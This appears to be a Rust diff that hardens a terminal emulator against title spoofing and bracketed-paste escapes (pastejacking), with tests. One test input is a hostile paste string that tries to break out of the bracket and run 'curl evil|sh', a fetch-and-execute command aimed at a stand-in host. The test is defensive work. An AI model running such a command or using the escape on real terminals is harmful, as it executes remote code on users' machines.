@@ -70,7 +70,8 @@ impl EventListener for EventProxy {
                 let _ = self.input.try_send(TerminalInput::Data(Bytes::from(text)));
             }
             TermEvent::Title(title) => {
-                *self.title.lock().unwrap_or_else(PoisonError::into_inner) = Some(title);
+                *self.title.lock().unwrap_or_else(PoisonError::into_inner) =
+                    Some(sanitize_title(&title));
             }
             TermEvent::ResetTitle => {
                 *self.title.lock().unwrap_or_else(PoisonError::into_inner) = None;
@@ -176,13 +177,14 @@ impl TerminalView {
     }
 
     /// Tab label: OSC title if the remote set one, else the host alias.
+    /// Tab label: always the alias (a remote title must not impersonate
+    /// another host), followed by the remote title if any.
     pub(crate) fn label(&self) -> String {
-        self.title
-            .lock()
-            .unwrap_or_else(PoisonError::into_inner)
-            .clone()
-            .filter(|t| !t.trim().is_empty())
-            .unwrap_or_else(|| self.alias.clone())
+        let title = self.title.lock().unwrap_or_else(PoisonError::into_inner);
+        match title.as_deref().filter(|t| !t.trim().is_empty()) {
+            Some(t) => format!("{} · {t}", self.alias),
+            None => self.alias.clone(),
+        }
     }
 
     pub(crate) fn mode(&self) -> TermMode {
@@ -220,21 +222,45 @@ impl TerminalView {
 
     pub(crate) fn paste(&self, text: &str) {
         let bracketed = self.mode().contains(TermMode::BRACKETED_PASTE);
-        let mut out = Vec::with_capacity(text.len() + 12);
-        if bracketed {
-            out.extend_from_slice(b"\x1b[200~");
-            // A pasted end marker would let the clipboard escape the bracket.
-            out.extend_from_slice(text.replace("\x1b[201~", "").as_bytes());
-            out.extend_from_slice(b"\x1b[201~");
-        } else {
-            out.extend_from_slice(text.replace("\r\n", "\r").replace('\n', "\r").as_bytes());
-        }
-        self.send(out);
+        self.send(encode_paste(text, bracketed));
     }
 
     pub(crate) fn close(&mut self) {
         let _ = self.input.try_send(TerminalInput::Close);
         self.closed = true;
+    }
+}
+
+/// Longest remote title kept (titles are re-rendered every frame).
+const MAX_TITLE: usize = 256;
+
+/// Removes bidi overrides (spoofing) and caps the length.
+fn sanitize_title(title: &str) -> String {
+    title
+        .chars()
+        .filter(|c| {
+            !matches!(c, '\u{202a}'..='\u{202e}' | '\u{2066}'..='\u{2069}') && !c.is_control()
+        })
+        .take(MAX_TITLE)
+        .collect()
+}
+
+/// Bytes sent for a paste. In bracketed mode every ESC / C1 introducer is
+/// removed so pasted text can never close the bracket early (no
+/// pastejacking); otherwise newlines become carriage returns.
+pub(crate) fn encode_paste(text: &str, bracketed: bool) -> Vec<u8> {
+    if bracketed {
+        let clean: String = text
+            .chars()
+            .filter(|&c| c != '\x1b' && c != '\u{9b}')
+            .collect();
+        let mut out = Vec::with_capacity(clean.len() + 12);
+        out.extend_from_slice(b"\x1b[200~");
+        out.extend_from_slice(clean.as_bytes());
+        out.extend_from_slice(b"\x1b[201~");
+        out
+    } else {
+        text.replace("\r\n", "\r").replace('\n', "\r").into_bytes()
     }
 }
 
@@ -327,6 +353,24 @@ mod tests {
 
     fn k(code: KeyCode, m: KeyModifiers) -> Option<Vec<u8>> {
         encode_key(KeyEvent::new(code, m), false)
+    }
+
+    #[test]
+    #[allow(clippy::naive_bytecount)] // tiny buffer, test only
+    fn bracketed_paste_cannot_escape() {
+        let out = encode_paste("\x1b[20\x1b[201~1~curl evil|sh\r", true);
+        assert!(out.ends_with(b"\x1b[201~"));
+        let escapes = out.iter().filter(|&&b| b == 0x1b).count();
+        assert_eq!(escapes, 2, "only the bracket markers");
+        assert_eq!(encode_paste("a\nb", false), b"a\rb");
+    }
+
+    #[test]
+    fn titles_are_sanitized_and_capped() {
+        let long = format!("\u{202e}{}", "x".repeat(10_000));
+        let t = sanitize_title(&long);
+        assert_eq!(t.chars().count(), MAX_TITLE);
+        assert!(!t.contains('\u{202e}'));
     }
 
     #[test]
